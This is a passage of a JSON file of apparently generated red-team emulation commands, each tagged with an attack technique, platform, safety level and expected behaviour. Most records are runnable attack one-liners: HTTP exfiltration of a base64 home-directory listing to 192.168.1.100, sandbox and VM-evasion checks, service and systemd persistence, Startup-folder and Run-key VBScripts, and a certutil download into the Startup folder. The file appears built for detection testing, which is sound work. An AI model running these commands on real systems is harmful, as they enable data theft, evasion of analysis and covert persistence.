      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "b86ee253-a073-4e3c-a18c-3a88350544ca",
      "ttp_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "echo 'simulated exfiltrated data' > /tmp/staged_data.txt && gzip /tmp/staged_data.txt && curl -H 'X-Exfil-Channel: HTTP' --data-binary @/tmp/staged_data.txt.gz http://localhost:8000/api/v1/data --write-out '%{http_code}' --silent --output /dev/null",
      "description": "Stages simulated data, compresses it, and sends via HTTP with custom header and minimal output.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a benign data file, compresses it, and sends it to a local HTTP service with a custom header. The curl command suppresses output and only returns the HTTP status code silently.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:17.760014",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "239fbf42-48ee-4c83-b7d6-a465fcecc827",
      "ttp_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "tasklist | findstr -i \"vmtoolsd vmactivedb\" && (echo Running in a virtual environment & exit) || echo System appears physical",
      "description": "Basic check for known virtualization process names using tasklist and findstr.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Checks running processes for 'vmtoolsd' or 'vmactivedb' (VMware tools). If found, prints 'Running in a virtual environment' and exits. Otherwise, prints 'System appears physical'.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.088036",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "71a42879-f1dc-4ad9-92be-3fe14bb3dcd0",
      "ttp_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "wmic computersystem get model | findstr -i \"virtual vbox qem\" && echo VM detected & exit",
      "description": "Intermediate check using WMI to query system model for virtualization indicators.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Queries the system model via WMI. If output contains 'virtual', 'vbox', or 'qem', it prints 'VM detected' and exits. Safe and uses only built-in tools.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.088036",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "197d0998-8627-4504-a42f-963b74692b66",
      "ttp_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"try { $services = Get-WmiObject -Class Win32_Service -Filter 'Name LIKE \"%sandbox%\" OR Name LIKE \"%vm%\"' -ErrorAction SilentlyContinue; if ($services) { echo 'Analysis environment detected'; exit } } catch { }; echo 'No sandbox services found'\"",
      "description": "Advanced check for sandbox-related services using PowerShell WMI query with error suppression.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Queries for Windows services with 'sandbox' or 'vm' in the name. If any are found, prints 'Analysis environment detected' and exits. Otherwise, prints 'No sandbox services found'. Uses proper error handling and quoting.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.088036",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "83599b18-0fef-4fdb-9f4f-aa04e8f6ab14",
      "ttp_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "grep -i 'qemu\\|virtualbox\\|vmware\\|xen' /proc/cpuinfo > /dev/null 2>&1 && echo 'Virtualized environment detected' || echo 'No virtualization CPU flags found'",
      "description": "Checks CPU info for hypervisor-related strings indicating virtualization",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs 'Virtualized environment detected' if virtualization artifacts are found in CPU flags, otherwise indicates none found",
      "source": "langchain",
      "generated_at": "2025-12-29T13:49:17.787673",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "1ef21ca4-af6a-4cf2-b405-1f8211120c57",
      "ttp_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "ps aux | grep -i 'sandbox\\|virtualbox\\|vmtoolsd' | grep -v 'grep' > /dev/null 2>&1 && echo 'Analysis tools detected' && exit 1 || echo 'No sandbox processes found'",
      "description": "Searches running processes for common sandbox or analysis tool names",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "If sandbox-related processes are found, outputs detection message and exits with code 1; otherwise indicates no detection",
      "source": "langchain",
      "generated_at": "2025-12-29T13:49:17.787673",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "113f1e98-68dc-46d9-8bba-607a5d46bf2f",
      "ttp_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
      "technique_name": "Virtualization/Sandbox Evasion",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "dmesg | grep -i 'hypervisor\\|vbox\\|vmware' > /dev/null 2>&1 && echo 'Hypervisor detected via kernel log' && exit 1 || echo 'No hypervisor evidence in dmesg'",
      "description": "Uses kernel ring buffer to detect hypervisor presence from boot messages",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Checks dmesg output for hypervisor clues; exits with code 1 if found, otherwise reports no evidence",
      "source": "langchain",
      "generated_at": "2025-12-29T13:49:17.787673",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "37b3c66e-aff6-49a2-af57-b39171451ec3",
      "ttp_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "hostname.exe",
      "description": "Basic command to retrieve the system hostname using a built-in Windows binary.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs the hostname of the system to stdout. No side effects. Runs instantly and is non-destructive.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.847611",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "de50e0f8-2ed4-4b74-9424-ab2cd762bc70",
      "ttp_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object ProcessName, MainWindowTitle\"",
      "description": "Intermediate command using PowerShell to list running processes that have a visible window title, simulating application window discovery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists processes with non-empty main window titles, indicating user-facing applications currently open. No modification is made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.847611",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "8d2eaa63-bed9-499e-8879-1d00dbb47f77",
      "ttp_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"try { $hostname = (hostname.exe).Trim(); $output = \"\"\"Hostname: $hostname`nActive Windows:`n\"\"\"; Get-Process | Where-Object { $_.MainWindowTitle } | ForEach-Object { $output += \"\"\"- $($_.ProcessName): '$($_.MainWindowTitle)'\n\"\"\" }; $tempFile = '$env:TEMP\\discovery_log.txt'; $output | Out-File -FilePath $tempFile -Encoding ASCII -Force; Write-Host 'Output written to $tempFile' } catch { Write-Error $_.Exception.Message }\"",
      "description": "Advanced command that gathers hostname and active window titles, then writes the data to a temporary file using PowerShell with proper error handling and escaping.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a log file in %TEMP% containing the hostname and list of processes with window titles. The file is saved safely using -Force only on Out-File (supported). Uses proper quote escaping with double double-quotes inside the string. No network activity or destructive actions occur.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.847611",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "656edd21-dbaf-46d8-a516-f5396d5efa69",
      "ttp_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "hostname",
      "description": "Basic command to retrieve the system hostname, simulating initial system reconnaissance.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs the hostname of the Linux system to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:54:11.513307",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "e2c60ba9-2875-4e98-92c3-1727e507d322",
      "ttp_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "xwininfo -tree -root 2>/dev/null | head -20",
      "description": "Intermediate command to list top-level window information from the X server root window, simulating application window discovery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays a tree of current X windows up to 20 lines; fails silently if no X session is active.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:54:11.513811",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "341e4e61-b87d-4114-b385-6e8c8bf99edf",
      "ttp_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "if command -v wmctrl &> /dev/null; then wmctrl -l; else echo 'wmctrl not available'; fi",
      "description": "Advanced command that checks for wmctrl and lists open windows, demonstrating conditional execution and tool availability checking.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "If wmctrl is installed, lists open windows with their IDs and titles; otherwise, prints fallback message.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:54:11.513811",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "342c5894-5e4f-4533-b64c-5431eb0543ff",
      "ttp_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "cmd.exe /c echo test_data > \"%TEMP%\\exfil.dat\" && certutil.exe -urlcache -f \"http://192.168.1.100/upload?data=exfil\" GET",
      "description": "Basic exfiltration using certutil to send data via GET request query parameter",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test file in %TEMP%, then uses certutil to make a GET request with the data in the URL query string. The server at 192.168.1.100 will receive the request if reachable.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.531720",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "6414e3e5-81a2-4ff4-ba11-a9214c142ca4",
      "ttp_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "cmd.exe /c dir \"%PROGRAMDATA%\" /b 2>&1 > \"%TEMP%\\dirlist.txt\" && powershell -Command \"(Invoke-WebRequest -Uri 'http://192.168.1.100/log?c2=1&data=' + (Get-Content '%TEMP%\\dirlist.txt' | Out-String).Trim() -Method GET -UseBasicParsing).StatusCode\"",
      "description": "Intermediate exfiltration: lists ProgramData directories and sends result in GET request",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Lists directory names in ProgramData, saves output to %TEMP%, reads it, URL-encodes it into a GET request, and sends to the mock C2 server. StatusCode is returned if available.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.531720",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "73e0feee-ba4c-4f8e-a443-d07f79cb73d0",
      "ttp_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "cmd.exe /c powershell -Command \"mkdir '%TEMP%\\exfil' -ErrorAction SilentlyContinue; echo 'sensitive_data_1' > '%TEMP%\\exfil\\file1.txt'; echo 'sensitive_data_2' > '%TEMP%\\exfil\\file2.txt'; Compress-Archive -Path '%TEMP%\\exfil\\*' -DestinationPath '%TEMP%\\payload.zip' -Force; $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP%\\payload.zip')); Remove-Item '%TEMP%\\exfil' -Recurse -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri 'http://192.168.1.100/exfil?size=$data.Length' -Body $data -Method GET -UseBasicParsing\"",
      "description": "Advanced exfiltration: creates multiple files, zips them, base64-encodes, and sends via GET request body",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary directory with test files, compresses them into a ZIP, reads and base64-encodes the archive, then sends the encoded data in the body of a GET request to the mock server. Directory is cleaned up afterward.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.531720",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "76107dce-e327-4005-aff0-ce27e1b92262",
      "ttp_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "curl -s \"http://192.168.1.100:8080/exfil?data=test_data\"",
      "description": "Basic exfiltration using curl to send a small test string via HTTP GET request.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends a GET request to the specified URL with 'test_data' as the query parameter value. No output is displayed due to -s (silent mode).",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:18.515632",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "a9b8e00b-1731-4f73-9ced-af742c2b6aea",
      "ttp_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "wget -q -O /dev/null \"http://192.168.1.100:8080/exfil?data=$(echo -n 'sensitive_file_content' | base64)\"",
      "description": "Intermediate exfiltration using wget to send base64-encoded test data in a GET request, mimicking file content exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes a benign string as base64 and sends it in the query string of a GET request. Response is discarded (-O /dev/null), and output is suppressed (-q).",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:18.515632",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "64dc9f27-ec66-43e2-9bba-1f6e656e4072",
      "ttp_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "export PAYLOAD=$(ls $HOME | base64); curl -s \"http://192.168.1.100:8080/exfil?listing=$PAYLOAD\" && unset PAYLOAD",
      "description": "Advanced exfiltration that captures a directory listing, base64-encodes it, sends it via GET request, and cleans up the environment variable.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Lists the user's home directory, encodes the output in base64, sends it as a parameter in a GET request, then unsets the variable. No local file is created.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:18.515632",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "7009f332-4fdb-4f17-a33c-c1ddd7ac8a27",
      "ttp_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_name": "New Service",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "sc create TestService binPath= \"C:\\Windows\\System32\\notepad.exe\" start= auto",
      "description": "Creates a new Windows service named TestService that runs notepad.exe and is set to start automatically.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The service 'TestService' appears in the service list and can be started, launching notepad.exe.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803165",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.673,
      "validated": true
    },
    {
      "id": "c1e11e14-1133-4963-ae0d-f01a99effe59",
      "ttp_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_name": "New Service",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"New-Service -Name 'PSService' -BinaryPathName 'C:\\Windows\\System32\\notepad.exe' -DisplayName 'PowerShell Test Service' -StartupType Automatic\"",
      "description": "Uses PowerShell to create a service named PSService that executes notepad.exe with automatic startup.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A service called 'PSService' is registered; it starts automatically on boot and runs notepad.exe when started.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803165",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.673,
      "validated": true
    },
    {
      "id": "78f69654-2499-4241-8cf8-404e52eea3fb",
      "ttp_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_name": "New Service",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\RegService\" /v ImagePath /t REG_EXPAND_SZ /d \"\\\"C:\\\\Windows\\\\System32\\\\notepad.exe\\\"\" /f && reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\RegService\" /v Type /t REG_DWORD /d 0x10 /f && reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\RegService\" /v Start /t REG_DWORD /d 2 /f",
      "description": "Directly creates service registry entries for a service named RegService that runs notepad.exe and is set to start automatically.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Registry keys for 'RegService' are added; the service becomes visible in the Services list and can be started to launch notepad.exe.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803165",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.673,
      "validated": true
    },
    {
      "id": "665b12a5-256c-4e5e-8456-eb0577abdcf9",
      "ttp_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_name": "New Service",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo bash -c 'printf \"[Unit]\\nDescription=Test Service\\n[Service]\\nExecStart=/usr/bin/touch /tmp/persistence_test\\n[Install]\\nWantedBy=multi-user.target\\n\" > /etc/systemd/system/testservice.service' && sudo systemctl daemon-reload && sudo systemctl enable --now testservice",
      "description": "Creates a simple systemd service that touches a file to demonstrate persistence.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "A new service named 'testservice' is installed, enabled, and started, creating /tmp/persistence_test each time the service runs.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.690660",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.673,
      "validated": true
    },
    {
      "id": "d90e8a88-5c3d-4b51-b5f2-eea91096a2cf",
      "ttp_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_id": "388167f4-c676-4172-889a-c9913782e894",
      "technique_name": "New Service",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo bash -c 'cat > /usr/local/bin/persist.sh <<\"EOF\"\n#!/bin/bash\necho \"Persist executed\" >> /tmp/persist.log\nEOF\nchmod +x /usr/local/bin/persist.sh' && sudo bash -c 'printf \"[Unit]\\nDescription=Persist Service\\n[Service]\\nExecStart=/usr/local/bin/persist.sh\\n[Install]\\nWantedBy=multi-user.target\\n\" > /etc/systemd/system/persist.service' && sudo systemctl daemon-reload && sudo systemctl enable --now persist.service",
      "description": "Installs a custom script and registers it as a systemd service for persistent execution.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The script /usr/local/bin/persist.sh is created and made executable. A service 'persist' runs the script, appending a line to /tmp/persist.log each time it starts.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.690660",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.673,
      "validated": true
    },
    {
      "id": "29371b6d-ede7-4622-9d7d-c0a79e432a2e",
      "ttp_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_name": "Registry Run Keys / Startup Folder",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "copy \"C:\\Windows\\System32\\calc.exe\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat\"",
      "description": "Basic persistence: copies a benign executable (calc.exe) to the Startup folder using legacy 'copy' command to simulate malicious persistence.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A copy of calc.exe is placed in the current user's Startup folder with a .bat extension. It will execute at next user login.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:33.583124",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "e104f97c-5fc8-4c30-a743-7609423e68fd",
      "ttp_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_name": "Registry Run Keys / Startup Folder",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"`$content = 'Set objShell = CreateObject(\\\"WScript.Shell\\\")\\r\\nobjShell.Popup \\\"System maintenance complete.\\\", 5, \\\"Update\\\", 0 + 64'; Set-Content -Path `\"`$env:TEMP\\startup_prompt.vbs`\" -Value `$content -Force; Copy-Item `\"`$env:TEMP\\startup_prompt.vbs`\" -Destination `\"`$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\prompt.vbs`\" -Force\"",
      "description": "Intermediate: creates a benign VBScript via PowerShell and places it in the Startup folder to simulate attacker behavior.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A VBScript file is created in %TEMP%, then copied to the Startup folder. At next login, it shows a popup message.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:33.583124",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "a2f92661-4169-4a82-b664-1d5d45941570",
      "ttp_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_name": "Registry Run Keys / Startup Folder",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"`$vbs = 'Dim objShell : Set objShell = CreateObject(\\\"WScript.Shell\\\") : objShell.RegWrite \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater\\\", \\\"\\\" & WScript.ScriptFullName & \\\"\\\", \\\"REG_SZ\\\" : MsgBox \\\"Persistence established.\\\"'; mkdir `\"`$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\`\" -ErrorAction SilentlyContinue; Set-Content -Path `\"`$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_check.vbs`\" -Value `$vbs -Force\"",
      "description": "Advanced: creates a self-persisting VBScript that writes to both Run key and Startup folder, demonstrating layered persistence technique.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A VBScript is placed in the Startup folder. When executed (e.g. at login), it will write a registry Run key pointing to itself and display a message.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:33.584294",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "953d16e1-aa92-43c3-934b-b54dd72f5653",
      "ttp_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
      "technique_name": "Registry Run Keys / Startup Folder",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo -e \\\"[Desktop Entry]\\\\nType=Application\\\\nExec=$HOME/.config/autostart/startup.sh\\\\nHidden=false\\\\nNoDisplay=false\\\\nX-GNOME-Autostart-enabled=true\\\\nName=StartupScript\\\" > \\\"$HOME/.config/autostart/startup.desktop\\\"",
      "description": "Creates a .desktop autostart entry that points to the previously created script.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A .desktop file is added to the user's autostart folder; the desktop environment will execute the script at login.",
      "source": "langchain",
      "generated_at": "2025-12-29T14:02:04.830237",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.669,
      "validated": true
    },
    {
      "id": "4476deb0-dd06-4f42-b6bb-2ef5cef50fc5",
      "ttp_id": "a748af4f-a5d1-4790-adff-8c5965cc1a33",
      "technique_id": "a748af4f-a5d1-4790-adff-8c5965cc1a33",
      "technique_name": "Modify Registry",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "echo Dim objShell : Set objShell = CreateObject(\"WScript.Shell\") : objShell.Popup \"System maintenance complete.\", 0, \"Update\", 0 > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs\"",
      "description": "Creates a VBScript file in the user's startup folder using echo command to achieve persistence. The script displays a benign popup on login.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named 'update.vbs' is created in the current user's startup directory. Upon next login, a popup message will appear saying 'System maintenance complete.' The command uses only built-in CMD features and is non-destructive.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.847611",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.667,
      "validated": true
    },
    {
      "id": "d36880b9-42d4-41ae-9160-43ceaf5fec98",
      "ttp_id": "a748af4f-a5d1-4790-adff-8c5965cc1a33",
      "technique_id": "a748af4f-a5d1-4790-adff-8c5965cc1a33",
      "technique_name": "Modify Registry",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "certutil -urlcache -split -f \"http://127.0.0.1/fake.txt\" \"%TEMP%\\payload.js\" 2>&1 >nul || echo Dim objShell : Set objShell = CreateObject(\"WScript.Shell\") : objShell.Popup \"Configuration applied.\", 0, \"Info\", 0 > \"%TEMP%\\payload.js\" & copy \"%TEMP%\\payload.js\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\config.vbs\" >nul & del \"%TEMP%\\payload.js\" >nul",
      "description": "Uses certutil to simulate downloading a script (fallback to local echo if URL fails), then copies it to the startup folder as a VBScript for persistence.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to 'download' a file using certutil (will fail safely), then creates a benign VBScript locally and copies it to the startup folder. On user login, a popup will appear. Uses only built-in tools and avoids actual payload delivery.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.847611",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.667,
      "validated": true
    },
    {
      "id": "63662777-9617-4f12-9cc7-825194de649a",
      "ttp_id": "a748af4f-a5d1-4790-adff-8c5965cc1a33",
      "technique_id": "a748af4f-a5d1-4790-adff-8c5965cc1a33",
      "technique_name": "Modify Registry",
